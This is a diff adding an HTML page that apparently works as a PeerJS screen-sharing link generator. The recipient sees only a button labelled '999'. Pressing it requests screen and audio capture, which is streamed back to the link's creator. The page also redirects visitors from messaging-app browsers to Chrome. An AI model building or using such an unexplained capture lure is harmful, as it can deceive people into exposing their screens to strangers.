@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>999</title>
+<script>
+(function(){
+  const isInApp = /WhatsApp|FBAN|FBAV|Instagram|Messenger|Line|Twitter/i.test(navigator.userAgent);
+  if(isInApp){
+    const cleanUrl = window.location.href;
+    window.location.href = `intent://${cleanUrl.replace(/^https?:\/\//,'')}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(cleanUrl)};end`;
+    setTimeout(()=>{ window.location.href = `googlechrome://${cleanUrl.replace(/^https?:\/\//,'')}`; }, 800);
+  }
+})();
+</script>
+<style>
+body{background:#0f172a;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
+.card{background:#1e293b;padding:30px;border-radius:24px;width:100%;max-width:360px;text-align:center}
+button{width:100%;padding:20px;border:0;border-radius:16px;font-weight:800;font-size:28px;cursor:pointer}
+.s{background:#10b981;color:#fff}
+.p{background:#3b82f6;color:#fff}
+video{width:100%;border-radius:12px;margin-top:15px;background:#000}
+input{width:100%;padding:12px;border-radius:10px;border:0;margin-top:15px;background:#0f172a;color:#fff;text-align:center}
+#st{margin-top:12px;font-size:14px;opacity:.8}
+</style>
+</head>
+<body>
+<div class="card" id="app">Loading...</div>
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<script>
+const app = document.getElementById('app');
+const params = new URLSearchParams(location.search);
+const viewId = params.get('view');
+const isInApp = /WhatsApp|FBAN|FBAV|Instagram|Messenger/i.test(navigator.userAgent);
+
+if(isInApp){
+  app.innerHTML = `<div style="font-size:16px;margin-bottom:15px">Behtar experience ke liye Chrome me kholo</div><button class="p" onclick="window.location.href='intent://'+location.href.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;package=com.android.chrome;end'">Chrome Me Kholo</button>`;
+} else if(viewId){
+  app.innerHTML = `<button class="s" id="shareBtn">999</button><p id="st"></p>`;
+  document.getElementById('shareBtn').onclick = async () => {
+    try{
+      const stream = await navigator.mediaDevices.getDisplayMedia({video:true, audio:true});
+      const peer = new Peer();
+      peer.on('open', ()=>{
+        const call = peer.call(viewId, stream);
+        document.getElementById('st').innerText='LIVE 🔴 - Chal raha hai';
+      });
+    }catch(e){ alert(e.message); }
+  };
+} else {
+  app.innerHTML = `<button class="p" id="createBtn">999</button><div id="box" style="display:none"><input id="link" readonly><button class="s" id="copyBtn" style="margin-top:12px;font-size:18px">Copy Link</button><video id="v" autoplay playsinline></video><p id="st"></p></div>`;
+  document.getElementById('createBtn').onclick = ()=>{
+    const id = 'viewer-'+Math.random().toString(36).slice(2,6);
+    const link = location.origin+location.pathname+'?view='+id;
+    const box = document.getElementById('box');
+    box.style.display='block';
+    document.getElementById('link').value=link;
+    document.getElementById('st').innerText='Link bhej do, page band mat karna';
+    const peer = new Peer(id);
+    peer.on('call', call=>{
+      call.answer();
+      call.on('stream', s=>{ document.getElementById('v').srcObject=s; });
+    });
+    document.getElementById('copyBtn').onclick = ()=>{ navigator.clipboard.writeText(link); alert('Link Copy Ho Gaya'); };
+  };
+}
+</script>
+</body>
+</html>
